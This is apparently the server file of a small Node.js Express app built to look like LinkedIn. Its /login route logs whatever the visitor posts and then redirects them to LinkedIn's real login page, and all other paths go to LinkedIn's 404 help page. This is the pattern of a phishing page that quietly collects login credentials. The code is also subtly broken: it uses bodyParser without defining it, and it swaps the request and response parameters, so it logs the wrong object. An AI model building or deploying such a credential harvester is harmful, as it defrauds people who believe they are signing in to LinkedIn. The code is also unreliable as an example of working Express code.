var express = require('express');
var path = require('path');
var logger = require('morgan');

var routes = require('./routes/routes');

var app = express();

app.use(logger('dev'));
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser);

// accept and log all post requests
app.post('/login', (res, req) => {
    console.log(req);
    req.redirect("https://www.linkedin.com/uas/login");
});

// catch 404 and forward to error handler
app.use(function(req, res, next) {
  // Redirect to LinkedIn 404 Page
  res.redirect("https://www.linkedin.com/help/linkedin/answer/85928/page-not-found-error?lang=en");
});

module.exports = app;
